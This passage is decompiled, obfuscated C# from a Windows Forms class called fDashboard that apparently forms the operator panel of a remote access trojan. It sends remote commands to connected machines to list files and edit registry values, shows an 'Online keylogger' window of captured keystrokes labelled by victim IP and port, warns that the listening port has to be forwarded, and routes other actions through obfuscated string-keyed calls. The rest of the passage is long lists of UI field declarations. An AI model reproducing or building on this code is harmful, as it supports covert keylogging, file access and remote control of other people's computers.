				fDashboard.Class127 @class = (fDashboard.Class127)this.vmethod_746().Items[e.Index];
				e.DrawBackground();
				e.Graphics.DrawImage(@class.method_2(), e.Bounds.Left + 5, e.Bounds.Top);
				e.Graphics.DrawString(@class.method_0(), new Font(this.Font, FontStyle.Regular), Brushes.Black, (float)(@class.method_2().Width + 10), (float)e.Bounds.Top, StringFormat.GenericDefault);
			}
		}
	}

	// Token: 0x0600096C RID: 2412 RVA: 0x00050770 File Offset: 0x0004E970
	public void method_269()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fDashboard.Delegate41(this.method_269), new object[0]);
			return;
		}
		if (this.Text.Length > 0)
		{
			this.Text = string.Empty;
			return;
		}
		this.Text = this.string_9;
	}

	// Token: 0x0600096D RID: 2413 RVA: 0x00006B72 File Offset: 0x00004D72
	private void method_270(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_269();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x0600096E RID: 2414 RVA: 0x000507C8 File Offset: 0x0004E9C8
	private void method_271(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectNotEqual(this.vmethod_776().Tag, "1", true))
		{
			this.vmethod_776().Tag = "1";
			this.method_273();
			if (!this.vmethod_810().IsBusy)
			{
				this.vmethod_810().RunWorkerAsync();
			}
		}
	}

	// Token: 0x0600096F RID: 2415 RVA: 0x0005081C File Offset: 0x0004EA1C
	private void method_272(object sender, DoWorkEventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<=*?:gq", object_);
	}

	// Token: 0x06000970 RID: 2416 RVA: 0x00050854 File Offset: 0x0004EA54
	public void method_273()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O='*?7Hg", object_);
	}

	// Token: 0x06000971 RID: 2417 RVA: 0x00050884 File Offset: 0x0004EA84
	private void method_274()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<q*?8H.", object_);
	}

	// Token: 0x06000972 RID: 2418 RVA: 0x000508B4 File Offset: 0x0004EAB4
	private void method_275(object sender, EventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O=<*?9kV", object_);
	}

	// Token: 0x06000973 RID: 2419 RVA: 0x000508EC File Offset: 0x0004EAEC
	private void method_276(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_784().Text) | Conversion.Val(this.vmethod_784().Text) < 1.0 | Conversion.Val(this.vmethod_784().Text) > 65535.0)
		{
			this.vmethod_784().BackColor = Color.Red;
			return;
		}
		this.vmethod_784().BackColor = Color.White;
	}

	// Token: 0x06000974 RID: 2420 RVA: 0x00050968 File Offset: 0x0004EB68
	private void method_277(object sender, EventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O<c*?;O0", object_);
	}

	// Token: 0x06000975 RID: 2421 RVA: 0x000509A0 File Offset: 0x0004EBA0
	private void method_278(object sender, EventArgs e)
	{
		if (this.process_0 != null)
		{
			try
			{
				this.process_0.Kill();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000976 RID: 2422 RVA: 0x00006B85 File Offset: 0x00004D85
	private void method_279(object sender, EventArgs e)
	{
		Interaction.MsgBox("This port has to be forwarded!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000977 RID: 2423 RVA: 0x000509E0 File Offset: 0x0004EBE0
	private void method_280(object sender, EventArgs e)
	{
		if (this.long_0 > 0L)
		{
			fDashboard.SendMessage((IntPtr)this.long_0, 256, 116, 0);
			fDashboard.SendMessage((IntPtr)this.long_0, 257, 116, 0);
		}
	}

	// Token: 0x06000978 RID: 2424 RVA: 0x00050A30 File Offset: 0x0004EC30
	private void method_281(object sender, EventArgs e)
	{
		if (this.long_0 > 0L)
		{
			fDashboard.SendMessage((IntPtr)this.long_0, 256, 120, 0);
			fDashboard.SendMessage((IntPtr)this.long_0, 257, 120, 0);
		}
	}

	// Token: 0x06000979 RID: 2425 RVA: 0x00050A80 File Offset: 0x0004EC80
	private void method_282(object sender, EventArgs e)
	{
		if (this.long_0 > 0L)
		{
			fDashboard.SendMessage((IntPtr)this.long_0, 256, 117, 0);
			fDashboard.SendMessage((IntPtr)this.long_0, 257, 117, 0);
		}
	}

	// Token: 0x0600097A RID: 2426 RVA: 0x00050AD0 File Offset: 0x0004ECD0
	private void method_283(object sender, EventArgs e)
	{
		if (this.long_0 > 0L)
		{
			fDashboard.SendMessage((IntPtr)this.long_0, 256, 118, 0);
			fDashboard.SendMessage((IntPtr)this.long_0, 257, 118, 0);
		}
	}

	// Token: 0x0600097B RID: 2427 RVA: 0x00050B20 File Offset: 0x0004ED20
	private void method_284(object sender, EventArgs e)
	{
		if (this.long_0 > 0L)
		{
			fDashboard.SendMessage((IntPtr)this.long_0, 256, 119, 0);
			fDashboard.SendMessage((IntPtr)this.long_0, 257, 119, 0);
		}
	}

	// Token: 0x0600097C RID: 2428 RVA: 0x00050B70 File Offset: 0x0004ED70
	private void method_285(object sender, EventArgs e)
	{
		if (!this.vmethod_812().Checked)
		{
			this.vmethod_720().View = View.LargeIcon;
			this.vmethod_720().LargeImageList = this.imageList_2;
			this.vmethod_720().AutoArrange = false;
			this.vmethod_720().TileSize = new Size(128, 128);
			this.vmethod_720().Items.Clear();
			this.vmethod_812().Checked = true;
		}
		else
		{
			this.vmethod_720().Items.Clear();
			this.vmethod_720().View = View.Details;
			this.vmethod_720().SmallImageList = this.imageList_1;
			this.vmethod_812().Checked = false;
		}
		if (this.string_8.Length >= 3)
		{
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600097D RID: 2429 RVA: 0x00050CF0 File Offset: 0x0004EEF0
	private void method_286(object sender, EventArgs e)
	{
		if (this.vmethod_280().TextLength > 0)
		{
			string text = this.vmethod_280().Text;
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Text file |*.txt";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				byte[] bytes = Encoding.Unicode.GetBytes(text);
				bool flag = true;
				byte[] byte_ = bytes;
				string text2 = fileName;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = text2;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x0600097E RID: 2430 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_287(object sender, EventArgs e)
	{
	}

	// Token: 0x0600097F RID: 2431 RVA: 0x00050DC0 File Offset: 0x0004EFC0
	private void method_288(object sender, EventArgs e)
	{
		this.bool_2 = this.vmethod_818().Checked;
		checked
		{
			if (this.bool_2)
			{
				Form form = this.fKeylogOnline_0;
				bool flag = false;
				Form form2 = form;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form2.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
				form2.Location = new Point(x, y);
				if (flag)
				{
					form2.Visible = true;
				}
				this.fKeylogOnline_0.Opacity = 100.0;
				this.fKeylogOnline_0.Text = string.Concat(new string[]
				{
					"Online keylogger - ",
					this.string_0,
					":",
					this.string_1,
					"^",
					this.string_2,
					" [",
					this.string_3,
					"]"
				});
				this.fKeylogOnline_0.Visible = true;
				this.fKeylogOnline_0.Activate();
				if (this.vmethod_286().TextLength > 0)
				{
					this.fKeylogOnline_0.vmethod_0().Rtf = this.vmethod_286().Rtf;
					return;
				}
			}
			else
			{
				this.fKeylogOnline_0.Visible = false;
			}
		}
	}

	// Token: 0x06000980 RID: 2432 RVA: 0x00050F28 File Offset: 0x0004F128
	private void method_289(object sender, MeasureItemEventArgs e)
	{
		e.ItemHeight = this.imageList_3.ImageSize.Height;
		e.ItemWidth = this.imageList_3.ImageSize.Width;
	}

	// Token: 0x06000981 RID: 2433 RVA: 0x00006B99 File Offset: 0x00004D99
	private void method_290(object sender, EventArgs e)
	{
		this.vmethod_740().Text = "Selected: 0";
	}

	// Token: 0x06000982 RID: 2434 RVA: 0x00050F68 File Offset: 0x0004F168
	private void method_291(object sender, EventArgs e)
	{
		if (this.vmethod_748().Items.Count > 0)
		{
			this.vmethod_730().Enabled = false;
			this.vmethod_728().Enabled = false;
			this.vmethod_724().Enabled = false;
			this.vmethod_726().Enabled = false;
			this.vmethod_744().Enabled = false;
			this.vmethod_746().Enabled = false;
			this.vmethod_748().Enabled = false;
			this.vmethod_750().Items.Clear();
			this.vmethod_750().BackColor = Color.White;
			this.vmethod_754().BringToFront();
			this.vmethod_754().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("reg_keys_get|", this.vmethod_748().SelectedItems[0].Tag));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000983 RID: 2435 RVA: 0x000510B0 File Offset: 0x0004F2B0
	private void method_292(object sender, EventArgs e)
	{
		if (this.vmethod_750().SelectedItems.Count != 0)
		{
			string text = Interaction.InputBox("Enter new value data", Application.ProductName, string.Empty, -1, -1);
			if (text.Length != 0)
			{
				if (text.Length > 0)
				{
					string text2 = "1";
					string text3 = this.vmethod_750().SelectedItems[0].Text;
					string text4 = Conversions.ToString(this.vmethod_750().SelectedItems[0].Tag);
					string text5 = this.vmethod_750().SelectedItems[0].SubItems[1].Text;
					if (Operators.CompareString(text5, "REG_NONE", true) == 0)
					{
						text2 = "0";
					}
					else if (Operators.CompareString(text5, "REG_SZ", true) == 0)
					{
						text2 = "1";
					}
					else if (Operators.CompareString(text5, "REG_EXPAND_SZ", true) == 0)
					{
						text2 = "2";
					}
					else if (Operators.CompareString(text5, "REG_BINARY", true) == 0)
					{
						text2 = "3";
					}
					else if (Operators.CompareString(text5, "REG_DWORD", true) == 0)
					{
						text2 = "4";
					}
					else if (Operators.CompareString(text5, "REG_DWORD_BIG_ENDIAN", true) == 0)
					{
						text2 = "5";
					}
					else if (Operators.CompareString(text5, "REG_LINK", true) == 0)
					{
						text2 = "6";
					}
					else if (Operators.CompareString(text5, "REG_MULTI_SZ", true) == 0)
					{
						text2 = "7";
					}
					else if (Operators.CompareString(text5, "REG_RESOURCE_LIST", true) == 0)
					{
						text2 = "8";
					}
					else if (Operators.CompareString(text5, "REG_FULL_RESOURCE_DESCRIPTOR", true) == 0)
					{
						text2 = "9";
					}
					else if (Operators.CompareString(text5, "REG_RESOURCE_REQUIREMENTS_LIST", true) == 0)
					{
						text2 = "10";
					}
					else if (Operators.CompareString(text5, "REG_QWORD", true) == 0)
					{
						text2 = "11";
					}
					string text6 = this.string_4;
					string text7 = string.Concat(new string[]
					{
						"reg_val_edit|",
						text4,
						"|",
						Convert.ToBase64String(Encoding.UTF8.GetBytes(text3)),
						"|",
						text2,
						"|",
						Convert.ToBase64String(Encoding.UTF8.GetBytes(text))
					});
					string text8 = text6;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text8;
					@class.string_1 = text7;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					return;
				}
				Interaction.MsgBox("Invalid value!", MsgBoxStyle.Exclamation, Application.ProductName);
			}
		}
	}

	// Token: 0x06000984 RID: 2436 RVA: 0x00006BAB File Offset: 0x00004DAB
	private void method_293(object sender, MouseEventArgs e)
	{
		this.vmethod_766().Enabled = (this.string_7.Length > 0);
		this.vmethod_772().Enabled = (this.vmethod_748().SelectedItems.Count > 0);
	}

	// Token: 0x06000985 RID: 2437 RVA: 0x00006BE4 File Offset: 0x00004DE4
	private void method_294(object sender, MouseEventArgs e)
	{
		this.vmethod_764().Enabled = (this.vmethod_750().SelectedItems.Count > 0);
	}

	// Token: 0x06000986 RID: 2438 RVA: 0x00051360 File Offset: 0x0004F560
	private void method_295(object sender, EventArgs e)
	{
		if (this.vmethod_76().Items.Count > 0)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_720().BackColor = Color.White;
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("files_get|", this.vmethod_76().SelectedItems[0].Tag), "|"), Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000987 RID: 2439 RVA: 0x000514D0 File Offset: 0x0004F6D0
	private void method_296(object sender, MouseEventArgs e)
	{
		ListViewItem item = this.vmethod_316().HitTest(e.Location).Item;
		if (item != null)
		{
			new Thread(new ThreadStart(new fDashboard.Class123
			{
				fDashboard_0 = this,
				int_0 = item.Index
			}._Lambda$__0)).Start();
		}
	}

	// Token: 0x0400020A RID: 522
	private MenuStrip menuStrip_0;

	// Token: 0x0400020B RID: 523
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x0400020C RID: 524
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x0400020D RID: 525
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x0400020E RID: 526
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x0400020F RID: 527
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x04000210 RID: 528
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x04000211 RID: 529
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x04000212 RID: 530
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x04000213 RID: 531
	private TabControl tabControl_0;

	// Token: 0x04000214 RID: 532
	private TabPage tabPage_0;

	// Token: 0x04000215 RID: 533
	private TabPage tabPage_1;

	// Token: 0x04000216 RID: 534
	private PictureBox pictureBox_0;

	// Token: 0x04000217 RID: 535
	private Label label_0;

	// Token: 0x04000218 RID: 536
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x04000219 RID: 537
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x0400021A RID: 538
	private TabPage tabPage_2;

	// Token: 0x0400021B RID: 539
	private ContextMenuStrip contextMenuStrip_1;

	// Token: 0x0400021C RID: 540
	private ToolStripMenuItem toolStripMenuItem_8;

	// Token: 0x0400021D RID: 541
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x0400021E RID: 542
	private ToolStripMenuItem toolStripMenuItem_9;

	// Token: 0x0400021F RID: 543
	private ToolStripMenuItem toolStripMenuItem_10;

	// Token: 0x04000220 RID: 544
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x04000221 RID: 545
	private ToolStripMenuItem toolStripMenuItem_11;

	// Token: 0x04000222 RID: 546
	private ToolStripMenuItem toolStripMenuItem_12;

	// Token: 0x04000223 RID: 547
	private ToolStripMenuItem toolStripMenuItem_13;

	// Token: 0x04000224 RID: 548
	private ToolStripMenuItem toolStripMenuItem_14;

	// Token: 0x04000225 RID: 549
	private ToolStripMenuItem toolStripMenuItem_15;

	// Token: 0x04000226 RID: 550
	private ToolStripMenuItem toolStripMenuItem_16;

	// Token: 0x04000227 RID: 551
	private ToolStripMenuItem toolStripMenuItem_17;

	// Token: 0x04000228 RID: 552
	private ToolStripMenuItem toolStripMenuItem_18;

	// Token: 0x04000229 RID: 553
	private ToolStripMenuItem toolStripMenuItem_19;

	// Token: 0x0400022A RID: 554
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x0400022B RID: 555
	private ToolStripSeparator toolStripSeparator_4;

	// Token: 0x0400022C RID: 556
	private ToolStripMenuItem toolStripMenuItem_20;

	// Token: 0x0400022D RID: 557
	private TabPage tabPage_3;

	// Token: 0x0400022E RID: 558
	private ContextMenuStrip contextMenuStrip_2;

	// Token: 0x0400022F RID: 559
	private ToolStripMenuItem toolStripMenuItem_21;

	// Token: 0x04000230 RID: 560
	private GClass7 gclass7_0;

	// Token: 0x04000231 RID: 561
	private GClass7 gclass7_1;

	// Token: 0x04000232 RID: 562
	private Label label_1;

	// Token: 0x04000233 RID: 563
	private ComboBox comboBox_0;

	// Token: 0x04000234 RID: 564
	private Label label_2;

	// Token: 0x04000235 RID: 565
	private VisualButton visualButton_0;

	// Token: 0x04000236 RID: 566
	private ComboBox comboBox_1;

	// Token: 0x04000237 RID: 567
	private Label label_3;

	// Token: 0x04000238 RID: 568
	private Label label_4;

	// Token: 0x04000239 RID: 569
	private CheckBox checkBox_0;

	// Token: 0x0400023A RID: 570
	private CheckBox checkBox_1;

	// Token: 0x0400023B RID: 571
	private RadioButton radioButton_0;

	// Token: 0x0400023C RID: 572
	private RadioButton radioButton_1;

	// Token: 0x0400023D RID: 573
	private ContextMenuStrip contextMenuStrip_3;

	// Token: 0x0400023E RID: 574
	private ToolStripMenuItem toolStripMenuItem_22;

	// Token: 0x0400023F RID: 575
	private ToolStripSeparator toolStripSeparator_5;

	// Token: 0x04000240 RID: 576
	private ToolStripMenuItem toolStripMenuItem_23;

	// Token: 0x04000241 RID: 577
	private ContextMenuStrip contextMenuStrip_4;

	// Token: 0x04000242 RID: 578
	private ToolStripMenuItem toolStripMenuItem_24;

	// Token: 0x04000243 RID: 579
	private ToolStripSeparator toolStripSeparator_6;

	// Token: 0x04000244 RID: 580
	private ToolStripMenuItem toolStripMenuItem_25;

	// Token: 0x04000245 RID: 581
	private ImageList imageList_0;

	// Token: 0x04000246 RID: 582
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_0;

	// Token: 0x04000247 RID: 583
	private StatusStrip statusStrip_0;

	// Token: 0x04000248 RID: 584
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x04000249 RID: 585
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x0400024A RID: 586
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x0400024B RID: 587
	private ToolStripStatusLabel toolStripStatusLabel_3;

	// Token: 0x0400024C RID: 588
	private ToolStripStatusLabel toolStripStatusLabel_4;

	// Token: 0x0400024D RID: 589
	private ToolStripProgressBar toolStripProgressBar_0;

	// Token: 0x0400024E RID: 590
	private ToolStripMenuItem toolStripMenuItem_26;

	// Token: 0x0400024F RID: 591
	private ToolStripMenuItem toolStripMenuItem_27;

	// Token: 0x04000250 RID: 592
	private ToolStripSeparator toolStripSeparator_7;

	// Token: 0x04000251 RID: 593
	private ToolStripSeparator toolStripSeparator_8;

	// Token: 0x04000252 RID: 594
	private ToolStripMenuItem toolStripMenuItem_28;

	// Token: 0x04000253 RID: 595
	private ToolStripMenuItem toolStripMenuItem_29;

	// Token: 0x04000254 RID: 596
	private ToolStripMenuItem toolStripMenuItem_30;

	// Token: 0x04000255 RID: 597
	private ToolStripMenuItem toolStripMenuItem_31;

	// Token: 0x04000256 RID: 598
	private ToolStripMenuItem toolStripMenuItem_32;

	// Token: 0x04000257 RID: 599
	private ToolStripSeparator toolStripSeparator_9;

	// Token: 0x04000258 RID: 600
	private Panel panel_0;

	// Token: 0x04000259 RID: 601
	private Label label_5;

	// Token: 0x0400025A RID: 602
	private ZeroitProgressBarNormal zeroitProgressBarNormal_0;

	// Token: 0x0400025B RID: 603
	private Label label_6;

	// Token: 0x0400025C RID: 604
	private Label label_7;

	// Token: 0x0400025D RID: 605
	private Label label_8;

	// Token: 0x0400025E RID: 606
	private ToolStripMenuItem toolStripMenuItem_33;

	// Token: 0x0400025F RID: 607
	private ToolStripMenuItem toolStripMenuItem_34;

	// Token: 0x04000260 RID: 608
	private ToolStripMenuItem toolStripMenuItem_35;

	// Token: 0x04000261 RID: 609
	private ToolStripMenuItem toolStripMenuItem_36;

	// Token: 0x04000262 RID: 610
	private ToolStripSeparator toolStripSeparator_10;

	// Token: 0x04000263 RID: 611
	private ToolStripMenuItem toolStripMenuItem_37;

	// Token: 0x04000264 RID: 612
	private ToolStripMenuItem toolStripMenuItem_38;

	// Token: 0x04000265 RID: 613
	private ToolStripMenuItem toolStripMenuItem_39;

	// Token: 0x04000266 RID: 614
	private ToolStripMenuItem toolStripMenuItem_40;

	// Token: 0x04000267 RID: 615
	private ToolStripMenuItem toolStripMenuItem_41;

	// Token: 0x04000268 RID: 616
	private ToolStripSeparator toolStripSeparator_11;

	// Token: 0x04000269 RID: 617
	private ToolStripMenuItem toolStripMenuItem_42;

	// Token: 0x0400026A RID: 618
	private ToolStripMenuItem toolStripMenuItem_43;

	// Token: 0x0400026B RID: 619
	private ToolStripMenuItem toolStripMenuItem_44;

	// Token: 0x0400026C RID: 620
	private ToolStripMenuItem toolStripMenuItem_45;

	// Token: 0x0400026D RID: 621
	private ToolStripMenuItem toolStripMenuItem_46;

	// Token: 0x0400026E RID: 622
	private ToolStripMenuItem toolStripMenuItem_47;

	// Token: 0x0400026F RID: 623
	private ToolStripMenuItem toolStripMenuItem_48;

	// Token: 0x04000270 RID: 624
	private Panel panel_1;

	// Token: 0x04000271 RID: 625
	private Label label_9;

	// Token: 0x04000272 RID: 626
	private Label label_10;

	// Token: 0x04000273 RID: 627
	private Label label_11;

	// Token: 0x04000274 RID: 628
	private Label label_12;

	// Token: 0x04000275 RID: 629
	private ZeroitProgressBarNormal zeroitProgressBarNormal_1;

	// Token: 0x04000276 RID: 630
	private ToolStripMenuItem toolStripMenuItem_49;

	// Token: 0x04000277 RID: 631
	private ToolStripMenuItem toolStripMenuItem_50;

	// Token: 0x04000278 RID: 632
	private ToolStripMenuItem toolStripMenuItem_51;

	// Token: 0x04000279 RID: 633
	private ToolStripMenuItem toolStripMenuItem_52;

	// Token: 0x0400027A RID: 634
	private ToolStripMenuItem toolStripMenuItem_53;

	// Token: 0x0400027B RID: 635
	private ToolStripMenuItem toolStripMenuItem_54;

	// Token: 0x0400027C RID: 636
	private ToolStripMenuItem toolStripMenuItem_55;

	// Token: 0x0400027D RID: 637
	private ToolStripMenuItem toolStripMenuItem_56;

	// Token: 0x0400027E RID: 638
	private ToolStripMenuItem toolStripMenuItem_57;

	// Token: 0x0400027F RID: 639
	private ToolStripMenuItem toolStripMenuItem_58;

	// Token: 0x04000280 RID: 640
	private ToolStripMenuItem toolStripMenuItem_59;

	// Token: 0x04000281 RID: 641
	private ToolStripMenuItem toolStripMenuItem_60;

	// Token: 0x04000282 RID: 642
	private ToolStripMenuItem toolStripMenuItem_61;

	// Token: 0x04000283 RID: 643
	private ToolStripMenuItem toolStripMenuItem_62;

	// Token: 0x04000284 RID: 644
	private ToolStripSeparator toolStripSeparator_12;

	// Token: 0x04000285 RID: 645
	private CheckBox checkBox_2;

	// Token: 0x04000286 RID: 646
	private PictureBox pictureBox_1;

	// Token: 0x04000287 RID: 647
	private ComboBox comboBox_2;

	// Token: 0x04000288 RID: 648
	private TabPage tabPage_4;

	// Token: 0x04000289 RID: 649
	private Label label_13;

	// Token: 0x0400028A RID: 650
	private Label label_14;

	// Token: 0x0400028B RID: 651
	private VisualButton visualButton_1;

	// Token: 0x0400028C RID: 652
	private Label label_15;

	// Token: 0x0400028D RID: 653
	private VisualButton visualButton_2;

	// Token: 0x0400028E RID: 654
	private PictureBox pictureBox_2;

	// Token: 0x0400028F RID: 655
	private ToolStripMenuItem toolStripMenuItem_63;

	// Token: 0x04000290 RID: 656
	private ComboBox comboBox_3;

	// Token: 0x04000291 RID: 657
	private TabPage tabPage_5;

	// Token: 0x04000292 RID: 658
	private ToolStripMenuItem toolStripMenuItem_64;

	// Token: 0x04000293 RID: 659
	private ToolStripMenuItem toolStripMenuItem_65;

	// Token: 0x04000294 RID: 660
	private ToolStripSeparator toolStripSeparator_13;

	// Token: 0x04000295 RID: 661
	private ToolStripMenuItem toolStripMenuItem_66;

	// Token: 0x04000296 RID: 662
	private RichTextBox richTextBox_0;

	// Token: 0x04000297 RID: 663
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x04000298 RID: 664
	private TabPage tabPage_6;

	// Token: 0x04000299 RID: 665
	private RichTextBox richTextBox_1;

	// Token: 0x0400029A RID: 666
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x0400029B RID: 667
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_1;

	// Token: 0x0400029C RID: 668
	private CheckBox checkBox_3;

	// Token: 0x0400029D RID: 669
	private ToolStripMenuItem toolStripMenuItem_67;

	// Token: 0x0400029E RID: 670
	private ToolStripMenuItem toolStripMenuItem_68;

	// Token: 0x0400029F RID: 671
	private ToolStripMenuItem toolStripMenuItem_69;

	// Token: 0x040002A0 RID: 672
	private TabPage tabPage_7;

	// Token: 0x040002A1 RID: 673
	private Label label_16;

	// Token: 0x040002A2 RID: 674
	private ComboBox comboBox_4;

	// Token: 0x040002A3 RID: 675
	private Label label_17;

	// Token: 0x040002A4 RID: 676
	private StatusStrip statusStrip_1;

	// Token: 0x040002A5 RID: 677
	private ToolStripStatusLabel toolStripStatusLabel_5;

	// Token: 0x040002A6 RID: 678
	private ToolStripStatusLabel toolStripStatusLabel_6;

	// Token: 0x040002A7 RID: 679
	private ToolStripStatusLabel toolStripStatusLabel_7;

	// Token: 0x040002A8 RID: 680
	private GClass7 gclass7_2;

	// Token: 0x040002A9 RID: 681
	private Label label_18;

	// Token: 0x040002AA RID: 682
	private ComboBox comboBox_5;

	// Token: 0x040002AB RID: 683
	private Label label_19;

	// Token: 0x040002AC RID: 684
	private ToolStripMenuItem toolStripMenuItem_70;

	// Token: 0x040002AD RID: 685
	private ComboBox comboBox_6;

	// Token: 0x040002AE RID: 686
	private Label label_20;

	// Token: 0x040002AF RID: 687
	private CheckBox checkBox_4;

	// Token: 0x040002B0 RID: 688
	private ContextMenuStrip contextMenuStrip_5;

	// Token: 0x040002B1 RID: 689
	private ToolStripMenuItem toolStripMenuItem_71;

	// Token: 0x040002B2 RID: 690
	private ToolStripSeparator toolStripSeparator_14;

	// Token: 0x040002B3 RID: 691
	private ToolStripMenuItem toolStripMenuItem_72;

	// Token: 0x040002B4 RID: 692
	private SaveFileDialog saveFileDialog_0;

	// Token: 0x040002B5 RID: 693
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x040002B6 RID: 694
	private ToolStripMenuItem toolStripMenuItem_73;

	// Token: 0x040002B7 RID: 695
	private ToolStripSeparator toolStripSeparator_15;

	// Token: 0x040002B8 RID: 696
	private ToolStripMenuItem toolStripMenuItem_74;

	// Token: 0x040002B9 RID: 697
	private TabPage tabPage_8;

	// Token: 0x040002BA RID: 698
	private RichTextBox richTextBox_2;

	// Token: 0x040002BB RID: 699
	private ToolStripMenuItem toolStripMenuItem_75;

	// Token: 0x040002BC RID: 700
	private ToolStripMenuItem toolStripMenuItem_76;

	// Token: 0x040002BD RID: 701
	private TabPage tabPage_9;

	// Token: 0x040002BE RID: 702
	private ContextMenuStrip contextMenuStrip_6;

	// Token: 0x040002BF RID: 703
	private ToolStripMenuItem toolStripMenuItem_77;

	// Token: 0x040002C0 RID: 704
	private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_2;

	// Token: 0x040002C1 RID: 705
	private ToolStripSeparator toolStripSeparator_16;

	// Token: 0x040002C2 RID: 706
	private ToolStripMenuItem toolStripMenuItem_78;

	// Token: 0x040002C3 RID: 707
	private ToolStripMenuItem toolStripMenuItem_79;

	// Token: 0x040002C4 RID: 708
	private ToolStripMenuItem toolStripMenuItem_80;

	// Token: 0x040002C5 RID: 709
	private ToolStripMenuItem toolStripMenuItem_81;

	// Token: 0x040002C6 RID: 710
	private ToolStripSeparator toolStripSeparator_17;

	// Token: 0x040002C7 RID: 711
	private ToolStripMenuItem toolStripMenuItem_82;

	// Token: 0x040002C8 RID: 712
	private ToolStripMenuItem toolStripMenuItem_83;

	// Token: 0x040002C9 RID: 713
	private ToolStripMenuItem toolStripMenuItem_84;

	// Token: 0x040002CA RID: 714
	private ToolStripMenuItem toolStripMenuItem_85;

	// Token: 0x040002CB RID: 715
	private Label label_21;

